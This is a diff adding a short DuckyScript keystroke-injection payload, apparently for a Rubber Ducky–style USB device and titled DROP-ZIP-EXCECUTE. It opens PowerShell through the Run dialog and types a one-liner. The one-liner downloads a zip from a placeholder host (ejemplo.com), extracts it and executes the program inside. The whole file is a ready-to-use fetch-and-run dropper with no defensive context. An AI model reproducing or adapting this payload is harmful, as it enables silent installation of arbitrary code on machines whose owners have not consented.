@@ -1,0 +1,13 @@
+REM Name: DROP-ZIP-EXCECUTE
+REM Author: Lumen Mod by dEEpEst
+REM Description: Downloads program in a zip file, then unzips and executes it
+REM Target: Windows 10 powershell
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell
+DELAY 300
+ENTER
+DELAY 600
+STRING Invoke-WebRequest -Uri "http://ejemplo.com/archivo.zip" -OutFile "C:\Descargas\archivo.zip"; Expand-Archive -Path "C:\Descargas\archivo.zip" -DestinationPath "C:\Descargas"; & "C:\Descargas\programa.exe"
+ENTER
